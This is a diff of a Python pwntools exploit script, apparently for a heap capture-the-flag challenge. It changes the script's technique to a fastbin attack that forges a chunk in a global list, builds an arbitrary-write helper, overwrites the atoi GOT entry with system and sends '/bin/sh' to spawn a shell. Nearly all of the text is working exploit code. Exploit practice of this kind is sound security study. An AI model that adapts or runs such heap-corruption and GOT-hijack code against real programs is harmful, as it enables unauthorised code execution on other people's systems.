@@ -27,26 +27,26 @@ def getpid():
 		pause()
 	
 def opt(idx):
-	g_io.sendlineafter("Your choice:", str(idx))	
+	g_io.sendafter("Your choice:", str(idx))	
 
 def add(size, content):
 	opt(1)
-	g_io.sendlineafter("Input group size:", str(size))
-	g_io.sendlineafter("Input group member:", content)
+	g_io.sendafter("Input group size:", str(size))
+	g_io.sendafter("Input group member:", content)
 
 def show(idx):
 	opt(2)
-	g_io.sendlineafter("Input group index:", str(idx))
+	g_io.sendafter("Input group index:", str(idx))
 	
 def change(idx, size, content):
 	opt(3)
-	g_io.sendlineafter("Input group index:", str(idx))
-	g_io.sendlineafter("Input group name:", str(size))
-	g_io.sendlineafter("Input group member:", content)
+	g_io.sendafter("Input group index:", str(idx))
+	g_io.sendafter("Input group name:", str(size))
+	g_io.sendafter("Input group member:", content)
 
 def remove(idx):
 	opt(4)
-	g_io.sendlineafter("Input group index:", str(idx))
+	g_io.sendafter("Input group index:", str(idx))
 
 def exit():
 	opt(5)
@@ -66,30 +66,37 @@ def pwn():
 
 	off_arena = 0x3c4b20
 	libc_base = addr_arena - off_arena
-	#one_gadget = libc_base + 0x4527a # [rsp+0x30] == NULL  
-	#fake_chunk = libc_base + g_libc.symbols["__realloc_hook"] - 0x1b
+	addr_system = libc_base + g_libc.symbols["system"]
 
-	log.success("libc@%#x\none_gadget@%#x\nfake_chunk@%#x" % (libc_base, one_gadget, fake_chunk))
+	log.success("libc@%#x\nsystem@%#x" % (libc_base, addr_system))
 	remove(1)	
 
 	# 2. fastbin attack: allocate to __realloc_hook, write one_gadget to it, then get shell
 	add(0x60, "ccc") # 2
-	add(0x60, "ddd") # 3
+	add(0x50, "ddd") # 3
 	remove(3)
 	
-	payload_fast_att = flat(['a'*0x60, 0x70, 0x71, fake_chunk])
+	g_list = 0x6020a0
+	fake_chunk = g_list + 0x18
+	payload_fast_att = flat(['a'*0x60, 0x70, 0x61, fake_chunk])
 	change(2, len(payload_fast_att) + 1, payload_fast_att)
 	
-	add(0x60, "eee") # 4
+	add(0x50, "eee") # 4
 
-	adjust_stack = libc_base + g_libc.symbols["realloc"]# + 0xc 
-	payload_hijack = flat(['a'*(0x1b-0x10), one_gadget, adjust_stack])
-	add(0x60, payload_hijack)
+	payload_hijack = flat(g_list + 8)
+	add(0x50, payload_hijack)
 
-	# trigger __malloc_hook
-	getpid()
-	opt(1)
-	g_io.sendlineafter("Input group size:", str(0x60))	
+	# define write_to()
+	def write_to(addr, size, data):
+		change(2, 8, p64(addr))
+		change(0, size, data)	
+	
+	write_to(g_elf.got["atoi"], 8, p64(addr_system))
+	
+	#getpid()
+	# getshell
+	g_io.sendafter("Your choice:", "/bin/sh")
+
 if "__main__" == __name__:
 	pwn()
 	g_io.interactive()
